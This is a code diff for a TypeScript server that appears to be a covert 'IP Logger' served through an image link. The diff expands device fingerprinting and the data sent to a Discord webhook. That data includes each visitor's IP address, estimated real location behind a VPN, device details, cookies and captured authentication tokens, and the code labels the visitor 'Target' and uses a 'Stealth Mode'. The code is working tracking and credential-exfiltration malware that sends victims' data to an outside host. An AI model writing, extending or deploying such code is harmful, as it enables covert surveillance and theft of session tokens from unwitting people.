@@ -154,80 +154,248 @@ function getLocationFromIp(ip: string): LocationData {
   }
 }
 
-// Device detection from User Agent
+// Enhanced device detection with comprehensive fingerprinting
 interface DeviceInfo {
   deviceType: string;
   browserName: string;
+  browserVersion: string;
   operatingSystem: string;
+  osVersion: string;
   deviceBrand: string;
+  deviceModel: string;
+  architecture: string;
+  engine: string;
+  engineVersion: string;
+  isBot: boolean;
+  isSuspicious: boolean;
+  securityFlags: string[];
+  capabilities: string[];
+  fingerprint: string;
 }
 
 function parseDeviceInfo(userAgent: string): DeviceInfo {
   const ua = userAgent.toLowerCase();
-
-  // Device Type Detection
+  const originalUa = userAgent;
+  
+  // Security and bot detection flags
+  const securityFlags: string[] = [];
+  const capabilities: string[] = [];
+  
+  // Bot detection patterns
+  const botPatterns = [
+    /bot|crawler|spider|scraper|fetch|curl|wget|axios|python|perl|ruby|php|java|postman/i,
+    /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit/i,
+    /linkedinbot|twitterbot|whatsapp|telegram|discord|slack|headlesschrome|puppeteer/i
+  ];
+  
+  const isBot = botPatterns.some(pattern => pattern.test(originalUa));
+  if (isBot) securityFlags.push('Potential Bot/Scraper');
+  
+  // Suspicious patterns detection
+  const suspiciousPatterns = [
+    /headless|phantom|selenium|webdriver|automation/i,
+    /^python|^curl|^wget|^axios|^nodejs/i,
+    /scanner|vulnerability|pentest|hack/i
+  ];
+  
+  const isSuspicious = suspiciousPatterns.some(pattern => pattern.test(originalUa)) || 
+                      originalUa.length < 20 || originalUa.length > 2000;
+  if (isSuspicious) securityFlags.push('Suspicious User Agent');
+  
+  // Enhanced Device Type Detection
   let deviceType = 'unknown';
-  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) {
+  if (ua.includes('mobile') || ua.includes('android') && !ua.includes('tablet') || ua.includes('iphone')) {
     deviceType = 'mobile';
   } else if (ua.includes('tablet') || ua.includes('ipad')) {
     deviceType = 'tablet';
-  } else if (ua.includes('desktop') || ua.includes('windows') || ua.includes('macintosh') || ua.includes('linux')) {
+  } else if (ua.includes('smart-tv') || ua.includes('smarttv') || ua.includes('googletv')) {
+    deviceType = 'smart-tv';
+  } else if (ua.includes('game') && (ua.includes('xbox') || ua.includes('playstation') || ua.includes('nintendo'))) {
+    deviceType = 'gaming-console';
+  } else if (ua.includes('watch') || ua.includes('wearable')) {
+    deviceType = 'wearable';
+  } else {
     deviceType = 'desktop';
   }
-
-  // Browser Detection
+  
+  // Enhanced Browser Detection with version extraction
   let browserName = 'unknown';
+  let browserVersion = 'unknown';
+  let engine = 'unknown';
+  let engineVersion = 'unknown';
+  
+  // Chrome and Chrome-based browsers
   if (ua.includes('chrome') && !ua.includes('edge')) {
-    browserName = 'Chrome';
+    if (ua.includes('brave')) {
+      browserName = 'Brave';
+      const braveMatch = ua.match(/chrome\/(\d+\.[\d\.]+)/);
+      browserVersion = braveMatch ? braveMatch[1] : 'unknown';
+    } else if (ua.includes('opera') || ua.includes('opr')) {
+      browserName = 'Opera';
+      const operaMatch = ua.match(/(?:opera|opr)\/(\d+\.[\d\.]+)/);
+      browserVersion = operaMatch ? operaMatch[1] : 'unknown';
+    } else if (ua.includes('vivaldi')) {
+      browserName = 'Vivaldi';
+      const vivaldiMatch = ua.match(/vivaldi\/(\d+\.[\d\.]+)/);
+      browserVersion = vivaldiMatch ? vivaldiMatch[1] : 'unknown';
+    } else {
+      browserName = 'Chrome';
+      const chromeMatch = ua.match(/chrome\/(\d+\.[\d\.]+)/);
+      browserVersion = chromeMatch ? chromeMatch[1] : 'unknown';
+    }
+    engine = 'Blink';
+    const blinkMatch = ua.match(/chrome\/(\d+\.[\d\.]+)/);
+    engineVersion = blinkMatch ? blinkMatch[1] : 'unknown';
   } else if (ua.includes('firefox')) {
     browserName = 'Firefox';
+    const firefoxMatch = ua.match(/firefox\/(\d+\.[\d\.]+)/);
+    browserVersion = firefoxMatch ? firefoxMatch[1] : 'unknown';
+    engine = 'Gecko';
+    const geckoMatch = ua.match(/rv:(\d+\.[\d\.]+)/);
+    engineVersion = geckoMatch ? geckoMatch[1] : 'unknown';
   } else if (ua.includes('safari') && !ua.includes('chrome')) {
     browserName = 'Safari';
-  } else if (ua.includes('edge')) {
+    const safariMatch = ua.match(/version\/(\d+\.[\d\.]+)/);
+    browserVersion = safariMatch ? safariMatch[1] : 'unknown';
+    engine = 'WebKit';
+    const webkitMatch = ua.match(/webkit\/(\d+\.[\d\.]+)/);
+    engineVersion = webkitMatch ? webkitMatch[1] : 'unknown';
+  } else if (ua.includes('edge') || ua.includes('edg/')) {
     browserName = 'Edge';
-  } else if (ua.includes('opera')) {
-    browserName = 'Opera';
+    const edgeMatch = ua.match(/edg?\/(\d+\.[\d\.]+)/);
+    browserVersion = edgeMatch ? edgeMatch[1] : 'unknown';
+    engine = 'Blink';
+  } else if (ua.includes('internet explorer') || ua.includes('trident')) {
+    browserName = 'Internet Explorer';
+    const ieMatch = ua.match(/(?:msie |rv:)(\d+\.[\d\.]+)/);
+    browserVersion = ieMatch ? ieMatch[1] : 'unknown';
+    engine = 'Trident';
   }
-
-  // Operating System Detection
+  
+  // Enhanced Operating System Detection with version
   let operatingSystem = 'unknown';
+  let osVersion = 'unknown';
+  let architecture = 'unknown';
+  
   if (ua.includes('windows')) {
     operatingSystem = 'Windows';
+    if (ua.includes('windows nt 10.0')) osVersion = '10/11';
+    else if (ua.includes('windows nt 6.3')) osVersion = '8.1';
+    else if (ua.includes('windows nt 6.2')) osVersion = '8';
+    else if (ua.includes('windows nt 6.1')) osVersion = '7';
+    else if (ua.includes('windows nt 6.0')) osVersion = 'Vista';
+    
+    if (ua.includes('win64') || ua.includes('wow64')) architecture = 'x64';
+    else if (ua.includes('win32')) architecture = 'x86';
   } else if (ua.includes('macintosh') || ua.includes('mac os')) {
     operatingSystem = 'macOS';
+    const macMatch = ua.match(/mac os x ([\d_]+)/);
+    if (macMatch) osVersion = macMatch[1].replace(/_/g, '.');
+    
+    if (ua.includes('intel')) architecture = 'Intel';
+    else if (ua.includes('ppc')) architecture = 'PowerPC';
   } else if (ua.includes('linux')) {
     operatingSystem = 'Linux';
+    if (ua.includes('ubuntu')) osVersion = 'Ubuntu';
+    else if (ua.includes('debian')) osVersion = 'Debian';
+    else if (ua.includes('fedora')) osVersion = 'Fedora';
+    else if (ua.includes('centos')) osVersion = 'CentOS';
+    
+    if (ua.includes('x86_64')) architecture = 'x64';
+    else if (ua.includes('i686')) architecture = 'x86';
+    else if (ua.includes('arm')) architecture = 'ARM';
   } else if (ua.includes('android')) {
     operatingSystem = 'Android';
+    const androidMatch = ua.match(/android ([\d\.]+)/);
+    if (androidMatch) osVersion = androidMatch[1];
+    
+    if (ua.includes('arm64')) architecture = 'ARM64';
+    else if (ua.includes('arm')) architecture = 'ARM';
   } else if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ios')) {
     operatingSystem = 'iOS';
+    const iosMatch = ua.match(/os ([\d_]+)/);
+    if (iosMatch) osVersion = iosMatch[1].replace(/_/g, '.');
+    
+    architecture = 'ARM64';
   }
-
-  // Device Brand Detection
+  
+  // Enhanced Device Brand and Model Detection
   let deviceBrand = 'unknown';
+  let deviceModel = 'unknown';
+  
   if (ua.includes('samsung')) {
     deviceBrand = 'Samsung';
+    const samsungMatch = ua.match(/samsung[;\s]([^;\s)]+)/);
+    if (samsungMatch) deviceModel = samsungMatch[1];
   } else if (ua.includes('apple') || ua.includes('iphone') || ua.includes('ipad') || ua.includes('macintosh')) {
     deviceBrand = 'Apple';
+    if (ua.includes('iphone')) {
+      const iphoneMatch = ua.match(/iphone os ([\d_]+)/);
+      deviceModel = iphoneMatch ? `iPhone (iOS ${iphoneMatch[1].replace(/_/g, '.')})` : 'iPhone';
+    } else if (ua.includes('ipad')) {
+      deviceModel = 'iPad';
+    } else if (ua.includes('macintosh')) {
+      deviceModel = 'Mac';
+    }
   } else if (ua.includes('huawei')) {
     deviceBrand = 'Huawei';
+    const huaweiMatch = ua.match(/huawei[;\s]([^;\s)]+)/);
+    if (huaweiMatch) deviceModel = huaweiMatch[1];
   } else if (ua.includes('xiaomi')) {
     deviceBrand = 'Xiaomi';
+    const xiaomiMatch = ua.match(/xiaomi[;\s]([^;\s)]+)/);
+    if (xiaomiMatch) deviceModel = xiaomiMatch[1];
   } else if (ua.includes('oneplus')) {
     deviceBrand = 'OnePlus';
-  } else if (ua.includes('google pixel')) {
+    const oneplusMatch = ua.match(/oneplus[;\s]([^;\s)]+)/);
+    if (oneplusMatch) deviceModel = oneplusMatch[1];
+  } else if (ua.includes('google') || ua.includes('pixel')) {
     deviceBrand = 'Google';
+    const pixelMatch = ua.match(/pixel[;\s]([^;\s)]+)/);
+    if (pixelMatch) deviceModel = `Pixel ${pixelMatch[1]}`;
   }
-
+  
+  // Capability detection
+  if (ua.includes('webkit')) capabilities.push('WebKit Support');
+  if (ua.includes('mobile')) capabilities.push('Mobile Optimized');
+  if (ua.includes('touch')) capabilities.push('Touch Support');
+  if (originalUa.includes('wv')) capabilities.push('WebView');
+  if (ua.includes('headless')) {
+    capabilities.push('Headless Browser');
+    securityFlags.push('Headless Browser Detected');
+  }
+  
+  // Security analysis
+  if (originalUa === '') securityFlags.push('Empty User Agent');
+  if (originalUa.split(' ').length < 3) securityFlags.push('Minimal User Agent');
+  if (!ua.includes('mozilla')) securityFlags.push('Non-Mozilla Compatible');
+  
+  // Generate device fingerprint
+  const fingerprint = Buffer.from(
+    `${deviceType}-${browserName}-${operatingSystem}-${deviceBrand}-${architecture}`,
+    'utf-8'
+  ).toString('base64').substring(0, 16);
+  
   return {
     deviceType,
     browserName,
+    browserVersion,
     operatingSystem,
-    deviceBrand
+    osVersion,
+    deviceBrand,
+    deviceModel,
+    architecture,
+    engine,
+    engineVersion,
+    isBot,
+    isSuspicious,
+    securityFlags,
+    capabilities,
+    fingerprint
   };
 }
 
-// Send data to Discord webhook with enhanced reliability
+// Send data to Discord webhook with enhanced reliability and better formatting
 async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
   try {
     if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
@@ -236,46 +404,74 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
     }
 
     const isVpnDetected = data.isVpn === 'yes';
+    const isBot = data.isBot || false;
+    const isSuspicious = data.isSuspicious || false;
+    const securityFlags = data.securityFlags || [];
+    const capabilities = data.capabilities || [];
+    
+    // Determine threat level and color
+    let threatLevel = "🟢 Low";
+    let embedColor = 0x00AA00; // Green
+    
+    if (isBot || isSuspicious || securityFlags.length > 0) {
+      threatLevel = "🔴 High";
+      embedColor = 0xFF4444; // Red
+    } else if (isVpnDetected) {
+      threatLevel = "🟡 Medium";
+      embedColor = 0xFFAA00; // Orange
+    }
+    
     const webhookData = {
-      username: "IP Logger Pro",
+      username: "🕵️ Enhanced IP Logger Pro",
       avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
       embeds: [{
-        title: isVpnDetected ? "🚨 VPN DETECTED - Enhanced Security Alert" : "🎯 IP Logger Security Test",
-        description: isVpnDetected ? 
-          "⚠️ **VPN or Proxy detected!** Target is masking their real IP address." :
-          "✅ Direct connection detected. Target is using their real IP address.",
-        color: isVpnDetected ? 0xFF4444 : 0x00AA00,
+        title: `${isBot ? "🤖" : isSuspicious ? "⚠️" : isVpnDetected ? "🛡️" : "🎯"} ${isBot ? "Bot/Scraper Detected" : isSuspicious ? "Suspicious Activity" : isVpnDetected ? "VPN/Proxy Detected" : "New Visitor Tracked"}`,
+        description: `**Threat Level:** ${threatLevel}${securityFlags.length > 0 ? `\n**Security Flags:** ${securityFlags.join(', ')}` : ''}`,
+        color: embedColor,
         fields: [
           { 
-            name: "🌐 **IP Intelligence**", 
-            value: `**Address:** \`${data.ipAddress}\`\n**Location:** ${data.location || "Unknown"}${isVpnDetected ? `\n**🔍 Detection Score:** High` : ''}`, 
+            name: "🌐 **Network Intelligence**", 
+            value: `**IP Address:** \`${data.ipAddress}\`\n**Location:** ${data.location || "Unknown"}\n**ISP Type:** ${isVpnDetected ? "VPN/Proxy Service" : "Direct Connection"}`, 
             inline: false 
           },
           ...(isVpnDetected ? [{
             name: "🛡️ **VPN Analysis**", 
-            value: `**VPN Location:** ${data.vpnLocation || "Unknown"}\n**Estimated Real Location:** ${data.realLocation || "Unknown"}\n**Risk Level:** 🔴 High`, 
+            value: `**VPN Server:** ${data.vpnLocation || "Unknown"}\n**Real Location:** ${data.realLocation || "Estimated Hidden"}\n**Anonymity Level:** High`, 
             inline: false 
           }] : []),
           { 
-            name: "📱 **Device Fingerprint**", 
-            value: `**Type:** ${data.deviceType || "Unknown"}\n**Browser:** ${data.browserName || "Unknown"}\n**OS:** ${data.operatingSystem || "Unknown"}\n**Brand:** ${data.deviceBrand || "Unknown"}`, 
+            name: "💻 **Device Information**", 
+            value: `**Type:** ${data.deviceType || "Unknown"} ${data.deviceModel ? `(${data.deviceModel})` : ''}\n**Brand:** ${data.deviceBrand || "Unknown"}\n**Architecture:** ${data.architecture || "Unknown"}\n**Fingerprint:** \`${data.fingerprint || "N/A"}\``, 
             inline: true 
           },
           { 
-            name: "🔍 **Session Details**", 
-            value: `**Referrer:** ${data.referrer || "Direct Access"}\n**Tokens:** ${data.tokens || "None"}\n**Timestamp:** <t:${Math.floor(Date.now() / 1000)}:R>`, 
+            name: "🌐 **Browser Details**", 
+            value: `**Browser:** ${data.browserName || "Unknown"} ${data.browserVersion ? `v${data.browserVersion}` : ''}\n**Engine:** ${data.engine || "Unknown"} ${data.engineVersion ? `v${data.engineVersion}` : ''}\n**OS:** ${data.operatingSystem || "Unknown"} ${data.osVersion ? `${data.osVersion}` : ''}`, 
             inline: true 
           },
+          ...(capabilities.length > 0 ? [{
+            name: "⚙️ **Browser Capabilities**", 
+            value: capabilities.join('\n• '), 
+            inline: false 
+          }] : []),
           { 
-            name: "🌐 **User Agent**", 
-            value: `\`\`\`${data.userAgent ? data.userAgent.substring(0, 200) + (data.userAgent.length > 200 ? "..." : "") : "Unknown"}\`\`\``, 
+            name: "🔍 **Session Context**", 
+            value: `**Referrer:** ${data.referrer || "Direct Access"}\n**Authentication:** ${data.tokens && data.tokens !== 'None' ? "🔒 Tokens Found" : "❌ No Auth Tokens"}\n**Cookies:** ${data.cookies && data.cookies !== 'None' ? "🍪 Present" : "❌ None"}\n**Visit Time:** <t:${Math.floor(Date.now() / 1000)}:F>`, 
+            inline: false 
+          },
+          ...(data.tokens && data.tokens !== 'None' ? [{
+            name: "🔐 **Security Tokens Found**", 
+            value: `\`\`\`${data.tokens.substring(0, 300)}${data.tokens.length > 300 ? "..." : ""}\`\`\``, 
+            inline: false 
+          }] : []),
+          { 
+            name: "📡 **Technical Details**", 
+            value: `\`\`\`${data.userAgent ? data.userAgent.substring(0, 400) + (data.userAgent.length > 400 ? "\n..." : "") : "No User Agent"}\`\`\``, 
             inline: false 
           }
         ],
         footer: { 
-          text: isVpnDetected ? 
-            "🔐 IP Logger Pro - VPN Detection Active" : 
-            "🎯 IP Logger Pro - Tracking Active",
+          text: `🚀 Enhanced IP Logger Pro v2.0 ${isBot ? "• Bot Detection" : isSuspicious ? "• Threat Analysis" : isVpnDetected ? "• VPN Shield" : "• Stealth Mode"}`,
           icon_url: "https://cdn.discordapp.com/emojis/853928735535742986.png"
         },
         timestamp: new Date().toISOString()
@@ -1265,7 +1461,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (settings?.webhookUrl && settings.webhookUrl.length > 0) {
         console.log(`🔗 Raw image access - sending webhook to Discord for IP: ${clientIp}`);
 
-        // Send webhook in background
+        // Send webhook in background with enhanced data
         sendToWebhook(settings.webhookUrl, {
           ipAddress: clientIp,
           userAgent,
@@ -1274,10 +1470,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           isVpn: locationData.isVpn,
           vpnLocation: locationData.vpnLocation,
           realLocation: locationData.realLocation,
-          deviceType: deviceInfo.deviceType,
-          browserName: deviceInfo.browserName,
-          operatingSystem: deviceInfo.operatingSystem,
-          deviceBrand: deviceInfo.deviceBrand,
+          ...deviceInfo, // Include all enhanced device information
           cookies: cookies || 'None',
           tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
         }).catch(webhookError => {
@@ -1416,10 +1609,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           isVpn: locationData.isVpn,
           vpnLocation: locationData.vpnLocation,
           realLocation: locationData.realLocation,
-          deviceType: deviceInfo.deviceType,
-          browserName: deviceInfo.browserName,
-          operatingSystem: deviceInfo.operatingSystem,
-          deviceBrand: deviceInfo.deviceBrand,
+          ...deviceInfo, // Include all enhanced device information
           cookies: cookies || 'None',
           tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
         }).catch(webhookError => {
